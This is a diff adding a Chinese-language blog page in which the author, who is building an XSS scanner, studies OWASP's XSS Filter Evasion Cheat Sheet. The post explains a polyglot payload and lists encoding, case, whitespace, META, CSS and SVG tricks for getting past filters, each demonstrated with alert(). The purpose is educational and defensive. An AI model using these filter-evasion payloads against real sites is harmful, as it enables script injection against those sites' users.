@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="XSS," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="前言这段时间在公司写XSS扫描器，之前留下的脚本是遍历payload list的全量扫描，而我收到的需求是修改为类似于sqlmap的智能扫描模式。 在寻找到输入输出点之后，我开始思考智能化扫描能给扫描器带来什么样的提升。 直到今天，我才有了一个初步的答案：根据上下文环境，定制payload。 定制化的payload不仅能够根据WEB前端框架选择payload以减少扫描流量，还能根据输出点的实际情况">
+<meta name="keywords" content="XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Filter Evasion Cheat Sheet研究">
+<meta property="og:url" content="http://127.0.0.1:4000/2018/07/30/XSS-Filter-Evasion-Cheat-Sheet研究/index.html">
+<meta property="og:site_name" content="eviloH&#39;s space">
+<meta property="og:description" content="前言这段时间在公司写XSS扫描器，之前留下的脚本是遍历payload list的全量扫描，而我收到的需求是修改为类似于sqlmap的智能扫描模式。 在寻找到输入输出点之后，我开始思考智能化扫描能给扫描器带来什么样的提升。 直到今天，我才有了一个初步的答案：根据上下文环境，定制payload。 定制化的payload不仅能够根据WEB前端框架选择payload以减少扫描流量，还能根据输出点的实际情况">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-08-01T14:56:19.388Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS Filter Evasion Cheat Sheet研究">
+<meta name="twitter:description" content="前言这段时间在公司写XSS扫描器，之前留下的脚本是遍历payload list的全量扫描，而我收到的需求是修改为类似于sqlmap的智能扫描模式。 在寻找到输入输出点之后，我开始思考智能化扫描能给扫描器带来什么样的提升。 直到今天，我才有了一个初步的答案：根据上下文环境，定制payload。 定制化的payload不仅能够根据WEB前端框架选择payload以减少扫描流量，还能根据输出点的实际情况">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://127.0.0.1:4000/2018/07/30/XSS-Filter-Evasion-Cheat-Sheet研究/"/>
+
+
+
+
+
+  <title>XSS Filter Evasion Cheat Sheet研究 | eviloH's space</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">eviloH's space</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">想写就写</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://127.0.0.1:4000/2018/07/30/XSS-Filter-Evasion-Cheat-Sheet研究/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="eviloH">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/zy.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="eviloH's space">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS Filter Evasion Cheat Sheet研究</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-30T22:02:19+08:00">
+                2018-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/07/30/XSS-Filter-Evasion-Cheat-Sheet研究/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/07/30/XSS-Filter-Evasion-Cheat-Sheet研究/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间在公司写XSS扫描器，之前留下的脚本是遍历payload list的全量扫描，而我收到的需求是修改为类似于sqlmap的智能扫描模式。 在寻找到输入输出点之后，我开始思考智能化扫描能给扫描器带来什么样的提升。 直到今天，我才有了一个初步的答案：根据上下文环境，定制payload。 定制化的payload不仅能够根据WEB前端框架选择payload以减少扫描流量，还能根据输出点的实际情况判断过滤条件，通过一些方法来绕过过滤。 因此，我开始研究XSS绕过过滤的方法。 偶然翻到OWASP维护的XSS Filter Evasion Cheat Sheet，之前都只是拿其中的payload来使用，并没有仔细研究过每个payload的原理，就趁此机会好好研究。</p>
+<p>针对扫描器的应用场景，我将一些适应性广泛的payload记录下来，并且根据它们绕过的过滤条件将payload分类。 实验过程中发现payload无法执行，不得其解，等研究清楚了再补上。</p>
+<h1 id="一个绝妙的适应性payload"><a href="#一个绝妙的适应性payload" class="headerlink" title="一个绝妙的适应性payload"></a>一个绝妙的适应性payload</h1><p>首先吸引我眼球的是这样一个向量：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:/*--&gt;<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>OWASP对它的描述是，能够在多种上下文环境下运行，包括html、 script字符串、 js代码和url中生效。 这个payload正是扫描器需要的！但它是如何做到适应多种环境的呢？我们尝试对它进行分解。</p>
+<p>首先是一开始的Javascript伪协议，熟悉XSS的人对它肯定不陌生。 这种伪协议能够使后面的语句在a标签的href、 各类on事件中被当作JavaScript代码执行。 因此，它后面紧跟的注释符<code>/**/</code>之间的代码便被注释掉了，最后<code>//</code>之后的代码也被注释掉，真正执行的是<code>[]/+alert(1)</code>这个语句。 这个奇怪的语句是什么意思呢？我们知道，JavaScript是一种弱类型语言，在运算过程中对于算子的类型没有严格的要求。 上面这个语句可以看作a除以正b，其中a是空的数组，b是<code>alert(1)</code>这个函数的执行结果。 数组在计算时会被转化成它的长度，而函数则是使用函数的返回值。 由于alert函数是没有返回的，这个语句的执行结果便是NaN。 我们打开浏览器的控制台，执行这个语句，可以看到这个结果。 到此，我们的目标：alert(1)已经被成功执行了。 以上便是输出点在href或on事件中的情况，下面的代码可以验证这种情况。</p>
+<p>然后是html的注释结束符，以及一些标签的结束标签，这部分不细说。 我们现在关注后面的svg标签。 我们将这个payload直接保存在一个html文件中，最终生效的就是这个svg标签，它的唯一属性是一个onload的事件，内容为<code>+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//</code>，这个语句也会被当作JS代码执行。 和上面同理，+号分隔的字符会被分别处理最后再求和。 我们看到前面的<code>/&quot;/</code>和<code>/onmouseover=1/</code>和<code>/[*/[]/</code>都被当做JS的正则表达式了，自然没有语法错误。 最后的alert也成功执行。</p>
+<p>如果输出点在html属性中会怎么样呢？假设这个属性是在双引号字符串中，那么payload的前半部分<code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;</code>会闭合前面的双引号成为一个新的字符串，后面的<code>/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;&gt;</code>形成一个新的onmouseover事件。 这里注意html标签中字段是可以用/分割的，因此加号和onmouseover成为了这个标签的两个属性，onmouseover后面的语句也在鼠标滑过时成功被执行了，原理和上面一样，不再赘述。 单引号属性和双引号也基本相同，都是为标签新增了一个鼠标滑过事件。<br>如果这个输出点是在JavaScript代码中的字符串呢？同样，单引号、双引号之前的内容会闭合前面的字符串，而后面的<code>/+/onmouseover=1/+/[*/[]/+alert(1)//</code>也还是会被当做正则表达式和函数的求和，从而成功执行。</p>
+<p>此payload构造的精妙之处在于利用了+号和/号的多重含义，是得在任何上下文中都没有语法错误，实在精妙，令人拍案叫绝。</p>
+<h1 id="利用特殊编码绕过特殊字符过滤"><a href="#利用特殊编码绕过特殊字符过滤" class="headerlink" title="利用特殊编码绕过特殊字符过滤"></a>利用特殊编码绕过特殊字符过滤</h1><p>这类绕过方法其实在“那些年我们一起学XSS”中已经都出现过了，有下面几种情况。</p>
+<ol>
+<li>在html标签的属性中，可以用HTML实体编码<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(&amp;quot;XSS&amp;quot;)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>另外不带分号也是可以的,这种方法可以绕过针对&#xx;形式的过滤<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li>在JS字符串中，可以用Unicode编码<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>其中，\0061 = \u0061 = \x61<br>值得一提的是p神提过的技巧，<a href="https://www.leavesongs.com/PENETRATION/use-location-xss-bypass.html" target="_blank" rel="noopener">利用location来变形我们的XSS PAYLOAD</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>利用location使得JS语句执行变成JS字符串执行，从而可以利用Unicode编码绕过各种过滤。</p>
+<ol start="3">
+<li>特例svg。 svg在XSS中是一个有趣的标签，在它当中本来不能运行的js代码居然成功运行了！<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">holive&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这里能够运行的原因是svg后面的元素遵循xml标准，而在xml遵循实体编码。 具体的细节可以参考<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">SVG XSS的一个黑魔法</a>，讲得比我要细致很多。</p>
+<h1 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h1><p>很多WAF会将一些危险的关键字，诸如script、 on过滤掉。 我们来看看这个列表中有哪些绕过方式。</p>
+<ol>
+<li><p>在payload中加入站位符，正如我们平时写代码一样，空格、 tab、 换行都不影响代码正常运行：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav   ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0A;ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>双重转义。 有些WAF的逻辑有误，当我们输入\”时，会被转义成\“，从而使双引号逃逸：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">";alert('XSS');//</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>我认为它与重写script的payload有异曲同工之妙<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<ol start="3">
+<li>大小写，原理无需多说，过滤不仔细导致：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">JaVaScRiPt:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h1 id="零散的技巧"><a href="#零散的技巧" class="headerlink" title="零散的技巧"></a>零散的技巧</h1><p>利用重音符来包含字符串, 大部分过滤器都没有过滤这个字符：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=`<span class="attr">javascript:alert</span>("<span class="attr">RSnake</span> <span class="attr">says</span>, '<span class="attr">XSS</span>'")`&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>非常奇怪的img标签解析，OWASP上描述是为了兼容不规范的编码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> """&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="string">"XSS"</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>"&gt;</span><br></pre></td></tr></table></figure></p>
+<p>CSS中的XSS：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">body&#123;background-image:url(//eviloh.xyz);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@im\port'\ja\vasc\ript:alert("XSS")';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>使用meta标签：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0; URL=http://;URL=javascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>插入含有xss代码的flash，可以添加属性allowScriptAccess=”never”以及allownetworking=”internal”来减小被过滤的风险<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EMBED</span> <span class="attr">SRC</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span> <span class="attr">AllowScriptAccess</span>=<span class="string">"always"</span>&gt;</span><span class="tag">&lt;/<span class="name">EMBED</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>xss的绕过过滤技巧极多，受到浏览器、 上下文、 编码、 前端框架等多种因素影响，不管是手动测试还是集成为扫描器，都不是一蹴而就的事情，需要长时间的积累和迭代。 后面我会总结一个xss过滤速查表，力求能够更上攻击载荷更新的步伐。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/02/BKP2017-Writeup-Accelerated-zone/" rel="next" title="BKP2017-Writeup-Accelerated.zone">
+                <i class="fa fa-chevron-left"></i> BKP2017-Writeup-Accelerated.zone
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/zy.jpg"
+               alt="eviloH" />
+          <p class="site-author-name" itemprop="name">eviloH</p>
+           
+              <p class="site-description motion-element" itemprop="description">记录平淡的生活</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一个绝妙的适应性payload"><span class="nav-number">2.</span> <span class="nav-text">一个绝妙的适应性payload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用特殊编码绕过特殊字符过滤"><span class="nav-number">3.</span> <span class="nav-text">利用特殊编码绕过特殊字符过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过关键字过滤"><span class="nav-number">4.</span> <span class="nav-text">绕过关键字过滤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#零散的技巧"><span class="nav-number">5.</span> <span class="nav-text">零散的技巧</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后话"><span class="nav-number">6.</span> <span class="nav-text">后话</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">eviloH</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://eviloh.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://127.0.0.1:4000/2018/07/30/XSS-Filter-Evasion-Cheat-Sheet研究/';
+          this.page.identifier = '2018/07/30/XSS-Filter-Evasion-Cheat-Sheet研究/';
+          this.page.title = 'XSS Filter Evasion Cheat Sheet研究';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://eviloh.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
